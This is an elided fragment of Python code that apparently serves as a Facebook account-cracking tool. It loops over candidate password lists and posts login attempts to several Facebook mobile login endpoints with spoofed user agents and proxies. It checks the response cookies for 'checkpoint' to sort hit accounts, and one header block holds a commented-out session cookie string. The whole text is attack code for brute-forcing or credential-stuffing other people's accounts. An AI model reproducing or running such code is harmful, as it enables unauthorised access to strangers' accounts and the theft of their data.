...
def m2(idf,pwv):
 ...
 for pw in pwv:
  try:
   ...
   po = ses.post('https://x.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
  ...
  for pw in pwv:
    try:
      ...
      heade={
            ...
            'upgrade-insecure-requests': '1',
            'user-agent':'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFASWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36',}
      po = ses.post('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
      if "checkpoint" in po.cookies.get_dict().keys():
        idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
        if 'y' in cp_xdx:
 ...
 try:
  for ps in pwv:
   ...
   header_freefb =  {
            ...
            'sec-fetch-site': 'same-origin',
            'upgrade-insecure-requests': '1',
            'user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36',} #'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36',
 ...
 try:
  for ps in pwv:
   ...
   header_freefb = {
    ...
    # 'cookie': 'datr=K8U3ZjyeS7FkMfzQ8xlnsFmv; sb=MsU3Zo_Wb3brwU6zVsNGjAb6; ps_n=1; ps_l=1; m_pixel_ratio=2.75; wd=393x719; fr=0TH2Y8BjlKkgzcnqz..BmN8Uy..AAA.0.0.BmSJy3.AWVZgP5s9t0',
    'dpr': '2.75',
 ...
 try:
  for ps in pwv:
   ...
   header_freefb = {
            ...
            'sec-fetch-site': 'same-origin',
            'upgrade-insecure-requests': '1',
            'user-agent':'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFASWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36',} #'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
